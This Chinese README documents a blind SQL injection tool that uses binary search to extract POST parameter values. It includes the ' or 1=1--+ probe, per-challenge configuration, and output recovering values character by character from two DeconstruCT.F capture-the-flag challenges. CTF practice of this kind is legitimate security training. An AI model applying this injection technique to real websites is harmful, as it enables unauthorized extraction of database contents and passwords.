# 简述

二分法判断传入 POST 参数的合法性

类似二分法盲注

亦可适用于爆破 POST 参数的环境



使用时添加下列参数

```python
# url
url = ""
# 审查页面元素(正确回显)
check = ""
# _POST参数名
key = ""
# 测试语句
column = ""
```

"check"为传入正确形式参数时的正确回显

"key"为 POST 参数名

"column"为需要核验的参数名

必要时适当修改"payload"



# 使用示例一

如选取[DeconstruCT.F](https://ctf.dscvit.com/challenges)二零二一年十月一日赛题[Taxi Union Problems](https://ctf.dscvit.com/challenges#Taxi%20Union%20Problems-34)为例

其要寻得某一车牌号的地址，此为一 SQL 注入题型

输入

```
' or 1=1--+
```

有正确回显，此举为确认"payload"形式

提取内容作为"check"参数

其 post 参数名为"lisence_plate",为"key"

而要寻找的"location"为"column",其为测试的重点（脚本目的便是爆破该字段）

```python
# url
url = "http://extremely.uniquename.xyz:2052/"
# 审查页面元素(正确回显)
check = "TN-06-AP-9879"
# _POST参数名
key = "lisence_plate"
# 测试语句
column = "location"
```

执行结果如下

```
Find it : A
Find it : Ay
Find it : Aya
Find it : Ayan
Find it : Ayana
Find it : Ayanav
Find it : Ayanava
Find it : Ayanavar
Find it : Ayanavara
Find it : Ayanavaram
Find it : Ayanavaram
Successfully found the flag : Ayanavaram
```

# 使用示例二

选取同一比赛的另一赛题[The Gate Keeper](https://ctf.dscvit.com/challenges#The%20Gate%20Keeper-35)为例

该题提示爆破，密码即为 flag

```
' or 1=1--+
```

确认"payload"格式

回显无报错，为

```
The flag for the CTF is the password you entered.(If you havent cheated that is)
```

选择该语句为"check"内容

"key"与"column"皆为"password"

```python
# url
url = "http://extremely.uniquename.xyz:2082/"
# 审查页面元素(正确回显)
check = "The flag for the CTF is the password you entered.(If you havent cheated that is)"
# _POST参数名
key = "password"
# 测试语句
column = "password"
```

执行结果如下

```
Find it : d
Find it : ds
Find it : dsc
Find it : dsc{
Find it : dsc{y
Find it : dsc{yo
Find it : dsc{you
Find it : dsc{you_
Find it : dsc{you_c
Find it : dsc{you_ca
Find it : dsc{you_can
Find it : dsc{you_cann
Find it : dsc{you_canno
Find it : dsc{you_cannot
Find it : dsc{you_cannot_
Find it : dsc{you_cannot_c
Find it : dsc{you_cannot_ch
Find it : dsc{you_cannot_che
Find it : dsc{you_cannot_chea
Find it : dsc{you_cannot_cheat
Find it : dsc{you_cannot_cheat_
Find it : dsc{you_cannot_cheat_t
Find it : dsc{you_cannot_cheat_th
Find it : dsc{you_cannot_cheat_the
Find it : dsc{you_cannot_cheat_the_
Find it : dsc{you_cannot_cheat_the_g
Find it : dsc{you_cannot_cheat_the_ga
Find it : dsc{you_cannot_cheat_the_gat
Find it : dsc{you_cannot_cheat_the_gate
Find it : dsc{you_cannot_cheat_the_gate_
Find it : dsc{you_cannot_cheat_the_gate_k
Find it : dsc{you_cannot_cheat_the_gate_ke
Find it : dsc{you_cannot_cheat_the_gate_kee
Find it : dsc{you_cannot_cheat_the_gate_keep
Find it : dsc{you_cannot_cheat_the_gate_keepe
Find it : dsc{you_cannot_cheat_the_gate_keeper
Find it : dsc{you_cannot_cheat_the_gate_keeper}
Find it : dsc{you_cannot_cheat_the_gate_keeper}
Successfully found the flag : dsc{you_cannot_cheat_the_gate_keeper}
```

